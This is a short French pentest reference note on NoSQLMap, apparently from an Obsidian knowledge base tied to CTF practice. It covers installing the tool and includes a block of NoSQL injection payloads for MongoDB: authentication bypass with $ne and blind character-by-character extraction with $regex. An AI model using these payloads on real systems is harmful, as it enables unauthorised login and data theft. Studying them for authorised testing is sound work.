---
titre: "NoSQLMap"
tags: [Outils, Web, NoSQL, injection, mongodb]
source: https://github.com/codingo/NoSQLMap
---

# NoSQLMap

**Automatisation d'injection NoSQL** (surtout **MongoDB**). Automatise le bypass
d'authentification et l'extraction de données via les opérateurs NoSQL — la version
outillée de ce que j'ai fait à la main dans [[SQLI - Index]] (challenge NoSQL `$regex`)
et mon script [[Blind SQLi — Scripts d'automatisation]].

> ⚠️ Sur cible autorisée uniquement. Cf. `README`.

## Installation
```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap && pip install -r requirements.txt
python nosqlmap.py
```
> Outil en Python 2, un peu ancien. Pour du web moderne, l'injection manuelle
> (`param[$ne]=`, `param[$regex]=`) + [[Burp Suite|Burp]]/[[Caido]] Intruder reste
> souvent plus efficace.

## Principe des payloads NoSQL
```text
# bypass d'auth
username=admin&password[$ne]=x
# extraction blind, caractère par caractère
username[$regex]=^a&password[$ne]=x
# via JSON
{"username":"admin","password":{"$ne":null}}
```

## Réflexe
Comprendre les **opérateurs** (`$ne`, `$gt`, `$regex`, `$where`) est plus durable
que l'outil. Détails et méthodo : [[SQLI - Index]].
